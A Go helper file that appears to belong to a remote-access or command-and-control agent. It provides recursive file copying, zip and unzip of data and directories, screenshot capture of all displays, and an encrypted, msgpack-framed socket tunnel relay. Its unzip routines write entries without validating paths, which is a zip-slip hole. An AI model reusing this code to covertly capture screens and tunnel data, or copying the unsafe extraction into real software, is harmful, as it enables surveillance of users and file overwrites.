package functions

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/kbinani/screenshot"
	"github.com/vmihailenco/msgpack/v5"
	"gopher/utils"
	"image/png"
	"io"
	"io/fs"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"sync"
)

/// FS

func CopyFile(src, dst string, info fs.FileInfo) error {
	source, err := os.Open(src)
	if err != nil {
		return err
	}
	defer func(source *os.File) {
		_ = source.Close()
	}(source)

	var mode os.FileMode = 0644
	if runtime.GOOS != "windows" {
		mode = info.Mode()
	}

	dest, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE|os.O_TRUNC, mode)
	if err != nil {
		return err
	}
	defer func(dest *os.File) {
		_ = dest.Close()
	}(dest)

	_, err = io.Copy(dest, source)
	return err
}

func CopyDir(srcDir, dstDir string) error {
	srcInfo, err := os.Stat(srcDir)
	if err != nil {
		return err
	}

	var mode os.FileMode = 0755
	if runtime.GOOS != "windows" {
		mode = srcInfo.Mode()
	}

	err = os.MkdirAll(dstDir, mode)
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(srcDir, entry.Name())
		dstPath := filepath.Join(dstDir, entry.Name())

		info, err := entry.Info()
		if err != nil {
			return err
		}

		if info.IsDir() {
			err = CopyDir(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {
			err = CopyFile(srcPath, dstPath, info)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

/// ZIP

func ZipBytes(data []byte, name string) ([]byte, error) {
	var buf bytes.Buffer
	zipWriter := zip.NewWriter(&buf)

	writer, err := zipWriter.Create(name)
	if err != nil {
		return nil, err
	}

	_, err = writer.Write(data)
	if err != nil {
		return nil, err
	}

	err = zipWriter.Close()
	if err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipBytes(zipData []byte) (map[string][]byte, error) {
	result := make(map[string][]byte)
	reader := bytes.NewReader(zipData)

	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
	if err != nil {
		return nil, err
	}

	for _, file := range zipReader.File {
		rc, err := file.Open()
		if err != nil {
			return nil, err
		}
		defer rc.Close()

		var buf bytes.Buffer
		_, err = io.Copy(&buf, rc)
		if err != nil {
			return nil, err
		}

		result[file.Name] = buf.Bytes()
	}

	return result, nil
}

func ZipFile(srcFilePath string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	fileToZip, err := os.Open(srcFilePath)
	if err != nil {
		return nil, err
	}
	defer fileToZip.Close()

	info, err := fileToZip.Stat()
	if err != nil {
		return nil, err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return nil, err
	}
	header.Name = filepath.Base(srcFilePath)
	header.Method = zip.Deflate

	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	_, err = io.Copy(writer, fileToZip)
	if err != nil {
		return nil, err
	}

	if err := zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipFile(zipPath string, targetDir string) error {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		destPath := filepath.Join(targetDir, f.Name)

		// Создание директорий
		if f.FileInfo().IsDir() {
			err = os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
			continue
		}

		// Убедимся, что директория существует
		err = os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
		if err != nil {
			return err
		}

		dstFile, err := os.Create(destPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		srcFile, err := f.Open()
		if err != nil {
			return err
		}
		defer srcFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		if err != nil {
			return err
		}
	}

	return nil
}

func ZipDirectory(srcDir string) ([]byte, error) {
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	err := filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(srcDir, path)
		if err != nil {
			return err
		}
		if info.IsDir() {
			if relPath == "." {
				return nil
			}
			relPath += "/"
			_, err = zipWriter.Create(relPath)
			return err
		}

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}
		header.Name = relPath
		header.Method = zip.Deflate

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		_, err = io.Copy(writer, file)
		return err
	})
	if err != nil {
		return nil, err
	}

	if err := zipWriter.Close(); err != nil {
		return nil, err
	}

	return buf.Bytes(), nil
}

func UnzipDirectory(zipData []byte, targetDir string) error {
	reader := bytes.NewReader(zipData)
	zipReader, err := zip.NewReader(reader, int64(len(zipData)))
	if err != nil {
		return err
	}

	for _, f := range zipReader.File {
		destPath := filepath.Join(targetDir, f.Name)

		if f.FileInfo().IsDir() {
			err := os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
			continue
		}

		err := os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
		if err != nil {
			return err
		}

		dstFile, err := os.Create(destPath)
		if err != nil {
			return err
		}
		defer dstFile.Close()

		srcFile, err := f.Open()
		if err != nil {
			return err
		}
		defer srcFile.Close()

		_, err = io.Copy(dstFile, srcFile)
		if err != nil {
			return err
		}
	}

	return nil
}

/// SCREENS

func Screenshots() (map[int][]byte, error) {
	result := make(map[int][]byte)
	num := screenshot.NumActiveDisplays()
	for i := 0; i < num; i++ {
		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(i))
		if err != nil {
			return nil, err
		}
		buf := new(bytes.Buffer)
		err = png.Encode(buf, img)
		if err != nil {
			return nil, err
		}
		result[i] = buf.Bytes()
	}
	return result, nil
}

/// NET

func ConnRead(conn net.Conn, size int) ([]byte, error) {
	if size <= 0 {
		return nil, fmt.Errorf("incorrected size: %d", size)
	}

	message := make([]byte, 0, size)
	tmpBuff := make([]byte, 1024)
	readSize := 0

	for readSize < size {
		toRead := size - readSize
		if toRead < len(tmpBuff) {
			tmpBuff = tmpBuff[:toRead]
		}

		n, err := conn.Read(tmpBuff)
		if err != nil {
			return nil, err
		}

		message = append(message, tmpBuff[:n]...)
		readSize += n
	}
	return message, nil
}

func RecvMsg(conn net.Conn) ([]byte, error) {
	bufLen, err := ConnRead(conn, 4)
	if err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(bufLen)

	return ConnRead(conn, int(msgLen))
}

func SendMsg(conn net.Conn, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, err := conn.Write(message)
	return err
}

func RelayMsgToSocket(ctx context.Context, cancel context.CancelFunc, wg *sync.WaitGroup, src net.Conn, dst net.Conn, tunKey []byte) {
	defer wg.Done()

	procSrvRead := func(data []byte) []byte {
		var inMessage utils.Message
		recvData, err := utils.DecryptData(data, tunKey)
		if err != nil {
			return nil
		}

		err = msgpack.Unmarshal(recvData, &inMessage)
		if err != nil {
			return nil
		}

		var buffer bytes.Buffer
		for _, obj := range inMessage.Object {
			var command utils.Command
			err = msgpack.Unmarshal(obj, &command)
			if err != nil {
				return nil
			}

			if command.Code == 1 {
				cancel()
				return nil
			}

			buffer.Write(command.Data)
		}

		return buffer.Bytes()
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			data, err := RecvMsg(src)
			if err != nil {
				cancel()
				continue
			}

			processed := procSrvRead(data)
			if processed != nil {
				written := 0
				for written < len(processed) {
					w, err := dst.Write(processed[written:])
					if err != nil {
						cancel()
						continue
					}
					written += w
				}
			}
		}
	}
}

func RelaySocketToMsg(ctx context.Context, cancel context.CancelFunc, wg *sync.WaitGroup, src net.Conn, dst net.Conn, tunKey []byte) {
	defer wg.Done()

	procSrvWrite := func(data []byte) []byte {
		buf, err := utils.EncryptData(data, tunKey)
		if err != nil {
			return nil
		}
		return buf
	}

	buf := make([]byte, 10000)
	for {
		select {
		case <-ctx.Done():
			return
		default:
			n, err := src.Read(buf)
			if err != nil {
				cancel()
				continue
			}

			processed := procSrvWrite(buf[:n])
			if processed == nil {
				continue
			}
			err = SendMsg(dst, processed)
			if err != nil {
				cancel()
				continue
			}
		}
	}
}
